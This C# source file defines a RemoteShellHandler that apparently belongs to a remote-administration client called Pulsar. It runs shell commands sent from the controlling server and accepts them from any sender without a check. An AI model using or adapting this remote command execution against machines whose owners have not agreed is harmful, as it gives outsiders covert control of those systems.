using Pulsar.Client.IO;
using Pulsar.Client.Networking;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.RemoteShell;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;

namespace Pulsar.Client.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote shell.
    /// </summary>
    public class RemoteShellHandler : IMessageProcessor, IDisposable
    {
        private Shell _shell;
        private readonly PulsarClient _client;
        private bool _disposed;

        public RemoteShellHandler(PulsarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected)
            {
                DisposeShell();
            }
        }

        public bool CanExecute(IMessage message)
        {
            return message is DoShellExecute;
        }

        public bool CanExecuteFrom(ISender sender)
        {
            return true;
        }

        public void Execute(ISender sender, IMessage message)
        {
            if (_disposed)
                return;

            var shellMsg = message as DoShellExecute;
            if (shellMsg == null)
                return;

            string cmd = shellMsg.Command;
            if (cmd == null)
                return;

            cmd = cmd.Trim();

            // If shell is not created yet
            if (_shell == null)
            {
                // No point creating a shell just to exit immediately
                if (string.Equals(cmd, "exit", StringComparison.OrdinalIgnoreCase))
                    return;

                _shell = new Shell(_client);
            }

            // Exit command
            if (string.Equals(cmd, "exit", StringComparison.OrdinalIgnoreCase))
            {
                DisposeShell();
                return;
            }

            // Execute normally
            _shell.ExecuteCommand(cmd);
        }

        private void DisposeShell()
        {
            try
            {
                if (_shell != null)
                    _shell.Dispose();
            }
            catch
            {
                // swallow – safe cleanup only
            }
            finally
            {
                _shell = null;
            }
        }

        public void Dispose()
        {
            if (_disposed)
                return;

            _disposed = true;

            DisposeShell();
            _client.ClientState -= OnClientStateChange;
        }
    }
}
